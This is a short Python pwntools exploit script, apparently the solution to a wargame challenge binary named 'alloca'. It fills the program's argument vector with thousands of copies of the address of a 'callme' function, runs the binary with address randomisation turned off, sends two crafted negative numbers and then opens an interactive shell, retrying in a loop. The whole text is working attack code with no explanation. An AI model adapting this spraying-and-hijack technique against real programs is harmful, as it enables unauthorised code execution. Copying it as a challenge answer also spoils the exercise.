from pwn import *
import time


context.log_level = 'info'


def main():
    p = None
    bin_path = '/home/alloca/alloca'
    e = ELF(bin_path)
    argv = [bin_path, p32(e.symbols.callme)*32000]

    for i in range(10000):
        log.info('iteration {}'.format(i))
        p = process(argv=argv, env={}, aslr=False)

        p.recvuntil('here is how to.\n\n')
        p.recvuntil('let me show you.\n\n')
        p.sendline('-82')
        p.sendline('-2445309')
        p.recvuntil('\n\n')
        time.sleep(1)

        p.interactive()


if __name__ == '__main__':
    main()
